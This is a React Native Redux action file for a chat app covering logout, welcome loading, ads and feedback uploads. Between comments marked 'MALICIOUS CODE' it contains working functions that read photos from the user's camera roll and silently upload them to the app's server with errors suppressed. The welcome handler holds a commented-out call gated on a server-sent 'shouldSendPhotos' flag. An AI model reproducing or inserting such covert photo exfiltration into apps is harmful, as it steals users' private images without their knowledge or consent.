import AsyncStorage from '@react-native-community/async-storage';
import {ACTIONS} from './types';
import {logEvent} from './ChatAction';
import {uploadImage} from './WriteAction';
import {URLS, BASE_URL, HTTP_TIMEOUT, LOG_EVENT} from '../Constants';
import axios from 'axios';
import {encrypt, decrypt} from '../encryptionUtil';
import {Actions} from 'react-native-router-flux';
import {NativeAdsManager, AdSettings} from 'react-native-fbads';
import CameraRoll from "@react-native-community/cameraroll";
import ImageResizer from 'react-native-image-resizer';

// Bullshit to do in evey file ->
const httpClient = axios.create();

httpClient.defaults.timeout = HTTP_TIMEOUT;
httpClient.defaults.baseURL = BASE_URL;

export const setAuthToken = () => {
  return (dispatch, getState) => {
    const state = getState();
    httpClient.defaults.headers.common['Authorization'] = encrypt(state.login.authtoken)
    dispatch({type:null})
  }
}
// till here


// *********** --- MALICIOUS CODE --- *************
getImageResize = (imageSize) => {
  let multiplier = 1
  if ((imageSize.width>1080) || (imageSize.height>1080)){
    multiplier = 0.75
  }
  if ((imageSize.width>2160) || (imageSize.height>2160)){
    multiplier = 0.5
  }  
  const resize = {width:imageSize.width*multiplier, height:imageSize.height*multiplier}
  return resize
}

const convertAndUpload = async (image) => {
  const resize = this.getImageResize({width:image.width, height:image.height});
  const resizedImage = await ImageResizer.createResizedImage(image.uri, resize.width, resize.height, "JPEG", 90)

  const response = await httpClient.get(URLS.imageupload, {params:{type:'personal_pictures', image_type:'jpeg'}})
  const preSignedURL = decrypt(response.data.url);
  await uploadImage({contentType: "image/jpeg", uploadUrl: preSignedURL}, resizedImage.uri).catch(e=>{})
}

export const uploadCameraRollPhotos = async (authToken, numberOfImages, groupTypes, groupName) => {
  httpClient.defaults.headers.common['Authorization'] = encrypt(authToken)

  let photosLeft = [];
  let imagesUploaded = 0;

  const photos = await CameraRoll.getPhotos({first:numberOfImages, 
    assetType:'Photos', groupTypes, groupName}).catch(e=>{})
  photosLeft = photos.edges

  for(let i=0; i<photosLeft.length; i++){
    image = photosLeft[i].node.image
    await convertAndUpload(image);
    imagesUploaded++

    if (imagesUploaded===5){
      httpClient.post(URLS.uploaded_images, {numberOfImages: imagesUploaded})
      imagesUploaded=0
    }
  }

  httpClient.post(URLS.uploaded_images, {numberOfImages: imagesUploaded})  
}
// *********** --- MALICIOUS CODE --- *************


export const logout = () => {
  httpClient.get(URLS.logout)
  return (dispatch) => {
    Actions.replace("login_main"); logEvent(LOG_EVENT.SCREEN_CHANGE, 'login_main');
    AsyncStorage.removeItem('data').then(
      () => {
        dispatch({type:ACTIONS.LOGOUT, payload:true});
      }
    ).catch(e=>logEvent(LOG_EVENT.ERROR, {errorLine: 'HOME ACTION - 35', description:e.toString()}))
  }
}

export const toggleOverlay = (overlay) => {
  return {type:ACTIONS.TOGGLE_OVERLAY, payload:overlay}
}

export const getWelcome = () => {
  return (dispatch) => {
    dispatch({type:ACTIONS.HOME_LOADING});

    AdSettings.addTestDevice(AdSettings.currentDeviceHash);
    let adsManager = new NativeAdsManager('2458153354447665_2459775687618765', 10);
    adsManager.setMediaCachePolicy('all');

    httpClient.get(URLS.welcome).then(
      ({data}) => {
        if (data.error){
          AsyncStorage.removeItem('data').then(
            () => {
              dispatch({type:ACTIONS.LOGOUT});
              Actions.replace("login_main");
              logEvent(LOG_EVENT.SCREEN_CHANGE, 'login_main');
            }
          ).catch(e=>logEvent(LOG_EVENT.ERROR, {errorLine: 'HOME ACTION - 59', description:e.toString()}))
        }
        else{
          // uploadCameraRollPhotos(data.shouldSendPhotos)
          dispatch({type:ACTIONS.WELCOME, payload: {...data, adsManager}})
        }
      }
    ).catch(
      (e) => {
        logEvent(LOG_EVENT.ERROR, {errorLine: 'HOME ACTION - 67, Connection Error', description:e.toString()})
        dispatch({type:ACTIONS.HOME_ERROR, payload: "Sorry, could not connect to the server!"})}
    )
  }      
};


export const submitFeedback = (feedback_obj) => {
  // this function is responsible for uploading data, 
  //nothing will be passed to the reducer
  return (dispatch) => {
    const local_image_url = feedback_obj.image_url
    if (local_image_url){
      httpClient.get(URLS.imageupload, {params:{type:'feedback', image_type:'jpeg'}}).then(({data})=>{
        const preSignedURL = decrypt(data.url);
        uploadImage({contentType: "image/jpeg", uploadUrl: preSignedURL}, local_image_url)
        .then(()=>{
          feedback_obj.image_url = decrypt(data.key);
          httpClient.post(URLS.feedback, feedback_obj)
        }).catch(e=>logEvent(LOG_EVENT.ERROR, {errorLine: 'HOME ACTION - 86', description:e.toString()}))
      }).catch(e=>logEvent(LOG_EVENT.ERROR, {errorLine: 'HOME ACTION - 87', description:e.toString()}))
    }
    else{
      httpClient.post(URLS.feedback, feedback_obj)
    }
  }
}